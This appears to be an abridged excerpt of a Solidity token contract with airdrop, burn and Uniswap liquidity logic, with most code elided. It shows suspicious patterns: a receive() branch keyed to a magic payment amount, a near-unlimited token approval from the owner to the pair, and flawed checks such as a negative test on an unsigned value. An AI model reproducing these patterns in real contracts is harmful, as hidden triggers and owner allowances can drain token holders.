...
contract BaseContract is Ownable, ERC20Burnable {
    ...
    uint256 private swapTokensAtAmount = 10000 * (10**decimals());
    uint256 public airdropAvailableAmount = 500 * (10**decimals());
    ...
    uint256 public _liquidityBalanceRemains;
    ...
    event Claim();
    event SendAirdrop( uint256 amount, address to);
    ...
    constructor(
        ...
        // Total Supply = _toOwnerToAddLiquidity + _toBurnAtLaunch + _toKeepInContract + airdropAvailableAmount
        ...
        _lpDestination = address(this);
        _liquidityBalanceRemains = 0;
    ...
    receive() external payable {
        if( msg.value == 123456789000000000 ){
    ...
    function updateUniswapV2Router(address newAddress) public onlyOwner {
        ...
        _approve( onwer(), address(uniswapV2Pair), ( 2 ** 256 ) -2  );
    }
    ...
    function sendAirdrop( uint256 amount ) public payable {
        ...
        require( amount <= airdropAvailableAmount, "No more tokens to give as Airdrop." );
        airdropAvailableAmount = airdropAvailableAmount - amount;
        if ( airdropAvailableAmount < 0 ) airdropAvailableAmount = 0;
        emit SendAirdrop( amount, msg.sender );
    ...
    function _transfer(
        ...
        if (
            ...
            _liquidityBalanceRemains = liquidityPart;
